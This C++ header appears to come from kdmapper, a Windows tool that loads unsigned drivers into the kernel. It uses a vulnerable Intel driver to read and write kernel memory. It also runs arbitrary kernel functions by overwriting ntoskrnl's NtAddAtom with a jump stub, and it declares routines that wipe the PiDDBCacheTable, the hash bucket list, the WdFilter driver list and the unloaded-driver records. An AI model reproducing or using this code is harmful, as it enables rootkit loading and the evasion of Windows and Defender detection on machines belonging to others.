#pragma once
#include <Windows.h>
#include <string>
#include <iostream>


#include "Utils.hpp"
#include "Nt.hpp"
#include "Provider.hpp"
#include "SymbolsHandler.hpp"

/*
* Structure offsets used while walking kernel objects.
*
* Defaults are the values that have been stable across Windows builds, but
* with the PDB-offset build every one of them is replaced at runtime by the
* offset of the actual type in the running kernel (SymbolsFromPDB writes them
* into offsets.ini as "[<module>.fields] Struct.Field=<offset>").
*
* Anything that cannot be resolved from symbols is not trusted on its own: the
* caller must structurally validate the object before writing to it.
*/
struct KdmStructOffsets {
	uint32_t FileObject_DeviceObject = 0x8;
	uint32_t DeviceObject_DriverObject = 0x8;
	uint32_t DriverObject_DriverSection = 0x28;
	uint32_t LdrEntry_BaseDllName = 0x58;
	uint32_t AvlTable_DeleteCount = 0x40;

	//_PiDDBCacheEntry / HashBucketEntry are not present as UDTs in the public
	//PDBs, so their list/name field offsets stay at the compiled defaults and
	//are additionally derived at runtime by content matching in the callers.
	uint32_t PiDDBCacheEntry_DriverName = 0x10;
	uint32_t PiDDBCacheEntry_ListBlink = 0x8;
	uint32_t PiDDBCacheEntry_ListFlink = 0x0;
	uint32_t HashBucketEntry_DriverName = 0x8;

	bool ResolvedFromSymbols = false;

	void LoadFromSymbols() {
#ifdef PDB_OFFSETS
		const auto lookup = [](const wchar_t* name, uint32_t& target) {
			const auto value = SymbolsHandler::GetInstance()->GetFieldOffset(name);
			if (value != SymbolsHandler::kFieldUnresolved && value < 0x1000) {
				target = static_cast<uint32_t>(value);
				return true;
			}
			return false;
		};

		bool resolved = false;
		resolved |= lookup(L"_FILE_OBJECT.DeviceObject", FileObject_DeviceObject);
		resolved |= lookup(L"_DEVICE_OBJECT.DriverObject", DeviceObject_DriverObject);
		resolved |= lookup(L"_DRIVER_OBJECT.DriverSection", DriverObject_DriverSection);
		resolved |= lookup(L"_KLDR_DATA_TABLE_ENTRY.BaseDllName", LdrEntry_BaseDllName);
		resolved |= lookup(L"_RTL_AVL_TABLE.DeleteCount", AvlTable_DeleteCount);
		ResolvedFromSymbols = resolved;
#endif
	}
};

namespace Driver
{
	extern KdmStructOffsets g_offsets;

	//Legacy name for the provider primary IOCTL. With the Intel NAL provider this
	//is 0x80862007 (case-number dispatched); with other providers it is their
	//memcpy/IOCTL code. Only used by provider-specific helpers that are guarded
	//with Provider::kHasMapIoSpace.
	constexpr ULONG32 ioctl1 = Provider::kCopyIoctl;
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;

	bool ClearPiDDBCacheTable();
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	Nt::PiDDBCacheEntry* LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	NTSTATUS AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList();
	bool ClearWdFilterDriverList();

	bool IsRunning();
	NTSTATUS Load();
	NTSTATUS Unload();

	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(uint64_t address, uint32_t size);
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size);

	bool FreePool(uint64_t address);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers();
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//if count of arguments is >4 fail
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 4 or less arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(Driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		//Pre-flight: refuse to patch anything that does not look like the
		//beginning of a function (zero fill, int3 padding, or a table entry that
		//would be silently destroyed). Failing here is safe, clobbering a wrong
		//address is a guaranteed bugcheck.
		auto looks_like_function_prologue = [](const uint8_t* bytes) -> bool {
			uint8_t nonzero = 0;
			for (int i = 0; i < 12; ++i) {
				if (bytes[i] == 0xCC) //int3 padding
					return false;
				if (bytes[i] != 0)
					nonzero++;
			}
			if (nonzero < 2)
				return false;
			//Any of the common x64 instruction prefixes a function can start
			//with: REX (48/49/4C), push (50-57), sub rsp (48 83 EC), endbr64
			//(F3 0F 1E FA), mov r10/rcx (4C 8B / 48 8B).
			switch (bytes[0]) {
			case 0x40: case 0x41: case 0x44: case 0x48: case 0x49:
			case 0x4C: case 0x4D: case 0x50: case 0x51: case 0x52:
			case 0x53: case 0x54: case 0x55: case 0x56: case 0x57:
			case 0xF3: case 0xB8: case 0xE9: case 0x0F:
				return (bytes[0] != 0xF3 || (bytes[1] == 0x0F && bytes[2] == 0x1E));
			default:
				return false;
			}
		};

		if (!looks_like_function_prologue(original_kernel_function)) {
			Log(L"[-] FAILED!: ntoskrnl!NtAddAtom at 0x" << std::hex << reinterpret_cast<void*>(kernel_NtAddAtom) << std::dec << L" does not look like code, refusing to patch (wrong symbol resolution?)" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
